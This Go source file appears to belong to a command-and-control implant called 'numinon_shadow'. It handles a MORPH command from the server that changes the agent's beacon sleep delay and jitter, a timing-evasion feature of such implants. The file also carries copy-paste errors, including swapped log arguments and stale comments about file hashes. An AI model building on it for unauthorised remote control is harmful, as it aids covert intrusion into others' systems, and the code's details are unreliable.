package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/agent/command/morph"
	"numinon_shadow/internal/models"
	"strings"
)

// orchestrateMorph is the orchestrator for the MORPH command.
func (a *Agent) orchestrateMorph(task models.ServerTaskResponse) models.AgentTaskResult {

	// Create an instance of the command-specific args struct
	var args models.MorphArgs

	// ServerTaskResponse.data contains the command-specific args, so now we unmarshall the field into the struct
	if err := json.Unmarshal(task.Data, &args); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal MorphArgs for Task ID %s: %v. Raw Data: %s", task.TaskID, err, string(task.Data))
		log.Printf("|❗ERR MORPH ORCHESTRATOR| %s", errMsg)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureUnmarshallError,
			Error:  errMsg,
		}
	}

	log.Printf("|✅ MORPH ORCHESTRATOR| Task ID: %s. Orchestrating MORPH to New Delay %d and/or New Jitter %d",
		task.TaskID, args.Jitter, args.BaseSleep)

	// Call the "doer" function
	morphResult, err := morph.DoMorph(args)

	// Prepare the final TaskResult
	finalResult := models.AgentTaskResult{
		TaskID: task.TaskID, // Hash of the raw file content
		Output: nil,         // Will be process info content on success
		Error:  "",          // Will be error message on failure
	}

	if err != nil {
		finalResult.Error = err.Error()

		log.Printf("|❗ERR MORPH ORCHESTRATOR| MORPH execution failed for Task ID %s: %s.",
			task.TaskID, finalResult.Error)

		// NOTE THIS NEEDS TO BE FIXED AND ADAPTED ONCE ACTUAL COMMAND HAS BEEN IMPLEMENTED IN DOER
		errorString := finalResult.Error
		switch {
		case strings.Contains(errorString, "validation:"):
			finalResult.Status = models.StatusFailureInvalidArgs
		case strings.Contains(errorString, "File not found"):
			finalResult.Status = models.StatusFailureFileNotFound
		case strings.Contains(errorString, "Permission denied"):
			finalResult.Status = models.StatusFailurePermissionDenied
		default:
			finalResult.Status = models.StatusFailureReadError
		}
	} else {
		// If we get here it means our doer call succeeded

		finalResult.Output = morphResult.Output

		finalResult.Status = models.StatusSuccess
		log.Printf("|✅ MORPH ORCHESTRATOR| Execution successful for Task ID %s. Sending %d base64 encoded bytes.",
			task.TaskID, len(finalResult.Output))
	}
	return finalResult
}
